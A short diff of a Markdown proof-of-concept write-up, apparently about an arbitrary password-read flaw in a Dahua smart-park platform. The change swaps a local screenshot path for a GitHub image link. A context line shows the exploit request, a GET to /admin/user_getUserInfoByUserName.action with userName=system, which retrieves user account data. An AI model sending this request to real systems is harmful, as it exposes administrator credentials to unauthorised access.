@@ -18,4 +18,4 @@ GET /admin/user_getUserInfoByUserName.action?userName=system HTTP/1.1
 
 响应包显示如下
 
-![image-20240613202058959](D:\py\POC\大华智慧园区任意密码读取攻击\image-20240613202058959.png)
+![image](https://github.com/hardog123/poc-exp/assets/170905460/92b8cfe8-2957-4587-8b23-275a6e9f014e)
